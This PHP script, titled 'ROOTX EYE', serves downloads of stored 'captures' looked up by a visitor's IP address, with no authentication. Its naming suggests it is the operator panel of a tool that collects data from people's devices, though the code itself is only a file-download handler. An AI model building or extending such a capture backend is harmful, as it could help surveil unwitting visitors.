<?php
// ============================================
// ROOTX EYE — DOWNLOAD FILE
// ============================================

$ip = $_GET['user'] ?? '';
$index = $_GET['download'] ?? '';

// Debug: Log parameters
error_log("Download request - IP: $ip, Index: $index");

if (empty($ip) || !isset($index) || $index === '') {
    die('Invalid request: Missing parameters');
}

$data_dir = __DIR__ . '/data/';
$captures_file = $data_dir . 'captures.json';

if (!file_exists($captures_file)) {
    die('No data found');
}

$all_data = json_decode(file_get_contents($captures_file), true) ?: [];
$user_data = null;

foreach ($all_data as $u) {
    if ($u['ip'] == $ip) {
        $user_data = $u;
        break;
    }
}

if (!$user_data) {
    die('User not found');
}

// Check if index exists
if (!isset($user_data['captures'][$index])) {
    die('Capture not found at index: ' . $index);
}

$capture = $user_data['captures'][$index];
$file = $capture['file'] ?? '';

if (empty($file)) {
    die('File path is empty');
}

if (!file_exists($file)) {
    die('File does not exist: ' . $file);
}

// Send file for download
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="' . basename($file) . '"');
header('Content-Length: ' . filesize($file));
readfile($file);
exit;
?>
